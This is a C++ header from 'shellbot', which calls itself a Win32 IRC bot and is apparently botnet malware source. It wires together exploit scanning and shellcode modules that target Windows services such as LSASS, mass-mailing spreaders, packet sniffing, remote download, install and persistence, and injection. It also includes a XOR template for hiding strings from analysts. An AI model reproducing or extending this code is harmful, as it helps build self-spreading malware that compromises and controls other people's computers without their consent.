/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. 
*/

#include "vCommands.h"
#include "Pcap.h"
#include "vConnect.h"
#include "vMisc.h"
#include "vScanner.h"
#include "vShellcode.h"
#include "vKeepAlive.h"
#include "vDownload.h"
#include "Main.h"
#include "color.h"
#include "CThread.h"
#include "HellMail.h"
#include "wabmail.h"
#include "rarpacker.h"
#include "wks_ftp.h"
#include "asn_ftp.h"
#include "pnp_ftp.h"
#include "lsass_ftp.h"

#define DEBUG_MODE
#define vsnprintf _vsnprintf
#define _QWORD_DEFINED 

//! Version of bot last published by Shellz
#define VERSION_SHELLBOT "4.0.0 LE"
#ifdef DEBUG_MODE
#undef SERVICE
#else
#define SERVICE
#endif

//Misc

//Shellcode
#define ENCODER_OFFSET_SIZE					14			// Offset for size of the encoder
#define ENCODER_OFFSET_XORKEY				19			// Offset for the xor key

//! lexical_cast using stringstream to convert
//! from one datatype to another (strings only)
template<class TO, class FROM> TO lexical_cast(FROM blah) 
{ 
	TO t; 
	std::stringstream ss; 
	ss<<blah; ss>>t; 
	return t;
} 

//! Color console...damn
namespace con = JadedHoboConsole;

//! The mother class 
class CPOEb 
{
public:
	static CPOEb s;
	bool Check(void);
	//! Color debug statements
	void DebugPrint(const char* szBracket, ostream& (*colorManip)(ostream&), const char* szPrint,...);
	CConnectIRC vIRC;	CCmd vCmd;
	CMain vMain;		CDownload vDownload;
	CInstall vInstall; 	CRegCheck vRegcheck;	
	CScanner vPOEscan;  CKeepAlive vKeepAlive;
	CPCAPCmd vPCAPCmd;  CShellcode vPOEshell;
	CDuplicateCheck vDupeCheck; CMail cmail;
	CMisc vMisc;

	int POEb(void);	
	bool botRunning;
	bool bInjected;
};

extern CPOEb *vPOEb;
//extern CJupe *jClientJupe;
//! XOR DECRYPTOR
//! (c) Online Gaming Cheats 
//! (c) System/bunny771
template <int XORSTART, int BUFLEN, int XREFKILLER>
class XorStr
{
private: 
	XorStr();
public: 
	char s[BUFLEN];

	XorStr(const char* xs);
	~XorStr(){ for(int i=0;i<BUFLEN;i++)s[i]=0;} // clear string from stack
};

template <int XORSTART, int BUFLEN, int XREFKILLER>
XorStr<XORSTART,BUFLEN,XREFKILLER>::XorStr(const char* xs)
{
	int xvalue = XORSTART;
	int i = 0;
	for(;i<(BUFLEN-1);i++) {
		s[i] = xs[i-XREFKILLER]^xvalue;
		xvalue += 1;
		xvalue %= 256;
	}
	s[BUFLEN-1] = 0;
}
